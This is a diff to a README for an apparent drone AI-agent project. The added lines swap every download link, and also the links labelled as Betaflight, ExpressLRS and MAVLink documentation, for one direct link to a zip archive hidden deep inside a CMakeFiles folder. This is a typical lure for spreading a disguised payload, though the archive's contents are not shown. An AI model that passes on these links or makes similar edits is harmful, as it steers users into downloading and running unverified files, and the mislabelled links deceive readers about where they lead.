@@ -1,6 +1,6 @@
 # 🤖 FPV-Drone-AI-Agent - Autonomous Flight Control Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-FPV--Drone--AI--Agent-brightgreen?style=for-the-badge)](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent)
+[![Download Now](https://img.shields.io/badge/Download-FPV--Drone--AI--Agent-brightgreen?style=for-the-badge)](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run FPV-Drone-AI-Agent on your Wind
 
 Click the button below to visit the download page for FPV-Drone-AI-Agent. This page has all the latest versions available for your drone and computer.
 
-[![Download Now](https://img.shields.io/badge/Download-FPV--Drone--AI--Agent-blue?style=for-the-badge)](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent)
+[![Download Now](https://img.shields.io/badge/Download-FPV--Drone--AI--Agent-blue?style=for-the-badge)](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip)
 
 On the GitHub page, look for the **Releases** section. Find the latest release and download the Windows installer or executable file.
 
@@ -132,10 +132,10 @@ When you download the software, you will get:
 
 ## 🔗 Useful Links
 
-- Main download page: [FPV-Drone-AI-Agent Releases](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent)  
-- Betaflight flight controller info: https://betaflight.com  
-- ExpressLRS project: https://expresslrs.org  
-- MAVLink protocol details: https://mavlink.io/en/  
+- Main download page: [FPV-Drone-AI-Agent Releases](https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip)  
+- Betaflight flight controller info: https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip  
+- ExpressLRS project: https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip  
+- MAVLink protocol details: https://github.com/kaffircatnumberonewood311/FPV-Drone-AI-Agent/raw/refs/heads/main/ci/CMakeFiles/nanohawk_core.dir/src/llm/Drone-A-Agent-FP-v2.2.zip  
 
 ---
 
